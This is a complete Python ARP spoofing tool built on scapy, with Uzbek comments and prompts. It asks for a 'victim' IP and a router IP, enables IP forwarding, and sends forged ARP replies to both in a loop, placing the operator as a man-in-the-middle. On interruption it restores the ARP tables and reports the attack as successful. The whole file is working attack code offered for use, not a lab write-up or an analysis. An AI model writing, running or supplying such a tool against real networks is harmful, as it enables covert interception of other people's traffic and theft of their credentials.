#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import re  # IPni tekshirish uchun
import os

# Ranglar uchun ANSI kodlari
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
END = "\033[0m"

def show_banner():
    banner = f"""
{BLUE}{BOLD}
****************************************************
* *
* ARP SPOOFER v2.0 - GitHub: https://github.com/UZinfosec404   
* *
****************************************************{END}
    """
    print(banner)



def enable_ip_forwarding():
    # IP forwardingni yoqish
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print(f"{GREEN}[+] IP Forwarding yoqildi.{END}")

def disable_ip_forwarding():
    # IP forwardingni o'chirish (Xavfsizlik uchun)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print(f"{RED}[-] IP Forwarding o'chirildi.{END}")

def is_valid_ip(ip):
    # IP manzil formatini tekshirish (0-255 oraliqdagi 4ta son)
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    if re.match(pattern, ip):
        # Har bir oktet 255 dan katta emasligini tekshirish
        return all(0 <= int(octet) <= 255 for octet in ip.split('.'))
    return False

def get_input(prompt):
    while True:
        value = input(f"{YELLOW}{BOLD}{prompt}{END}")
        if is_valid_ip(value):
            return value
        else:
            print(f"{RED}[!] Xato: IP manzil formati noto'g'ri (Masalan: 192.168.1.1). Qaytadan kiriting.{END}")

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"\n{RED}[!] Xato: {ip} manzilidan MAC olinmadi. Qurilma tarmoqda ekanligini tekshiring.{END}")
        sys.exit()

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

# --- ASOSIY QISM ---
show_banner()
if os.geteuid() != 0:
    print(f"{RED}[-] ROOT huquqi talab qilinadi (sudo ishlating).{END}")
    sys.exit()

window_ip = get_input("Jabrlanuvchi IP manzilini kiriting: >> ")
router_ip = get_input("Router IP manzilini kiriting: >> ")

start_time = time.time()
sent_packets_count = 0

try:
   
    print(f"\n{GREEN}[+] Hujum boshlandi... To'xtatish uchun CTRL+C bosing.{END}")
    enable_ip_forwarding()
    while True:
        spoof(window_ip, router_ip)
        spoof(router_ip, window_ip)
        sent_packets_count += 2
        print(f"\r{BLUE}[*] Yuborilgan paketlar: {sent_packets_count}{END}", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    duration = round(time.time() - start_time, 2)
    print(f"\n\n{YELLOW}[!] To'xtatildi. Tarmoq tiklanmoqda, iltimos kuting...{END}")
    restore(window_ip, router_ip)
    restore(router_ip, window_ip)
    
    print("\n" + "="*60)
    print(f"{GREEN}{BOLD}Hujum muvaffaqiyatli yakunlandi!{END}")
    print(f"Jami yuborilgan paketlar: {sent_packets_count}")
    print(f"Umumiy vaqt: {duration} sekund")
    print("="*60)
    disable_ip_forwarding()
